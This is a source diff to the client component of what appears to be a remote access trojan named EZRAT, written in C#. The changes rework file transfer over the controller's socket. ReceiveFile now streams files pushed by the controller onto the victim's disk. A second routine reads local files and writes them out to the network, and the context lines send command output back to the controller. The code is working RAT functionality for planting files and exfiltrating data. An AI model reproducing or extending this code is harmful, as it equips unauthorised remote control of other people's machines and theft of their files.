@@ -29,22 +29,39 @@ namespace EZRATClient.Core
             Program.SendCommand("cmd;" + path + ";" + result);
         }
 
-        public static void ReceiveFile(string data, string path)
+
+
+        public static void ReceiveFile(string path)
         {
-
-            string[] textValue = data.Split(Constantes.SeparatorChar);
-            byte[] fileData = new byte[textValue.Length];
-            for (int i = 0; i < textValue.Length - 1; i++)
+            int size = 1024;
+            long sizeFile = 0, tot = 0;
+            FileStream fs = new FileStream(path, FileMode.Create);
+            NetworkStream ns = new NetworkStream(Program._clientSocket);
+            try
             {
-                fileData[i] = Convert.ToByte(textValue[i]);
+                byte[] data = new byte[size];
+                bool loop_break = true;
+                ns.ReadTimeout = 2000;
+                do
+                {
+                    int nb = ns.Read(data, 0, size);
+                    fs.Write(data, 0, nb);
+                    fs.Flush();
+                    tot += (uint)nb;
+                    if (nb == -1)
+                    {
+                        loop_break = false;
+                    }
+                } while (loop_break);
             }
-            string dir = path.Substring(0, path.LastIndexOf('\\'));
-            if (!Directory.Exists(dir))
+            catch (IOException ex)
             {
-                Directory.CreateDirectory(dir);
+                Console.WriteLine($"Total data write : {tot}");
+                fs.Close();
+                ns.Close();
+                Program.SendCommand("upfilestop;");
+                return;
             }
-            File.WriteAllBytes(path, fileData);
-
         }
 
 
@@ -107,25 +124,9 @@ namespace EZRATClient.Core
                 fs.Read(data, 0, size);
                 tot += (uint)data.Length;
                 ns.Write(data, 0, size);
-                ns.Flush();
             }
             Console.WriteLine($"Total data : {tot}");
             fs.Close();
-            return;
-
-            //try
-            //{
-            //    //_clientSocket.SendFile(path); //Send the data to the server
-            //    string dataFile = string.Empty;
-            //    File.ReadAllBytes(path).ToList().ForEach((b) => { dataFile += b.ToString() + Constantes.Separator; });
-            //    byte[] result = Encoding.Default.GetBytes(Program.Encrypt("dlfile;" + dataFile));
-            //    Program._clientSocket.Send(result);
-            //}
-            //catch (Exception ex) //Failed to send data to the server
-            //{
-            //    Console.WriteLine("Send File Failure " + ex.Message);
-            //    return; //Return
-            //}
         }
 
         public static void WindowsControl(string command)
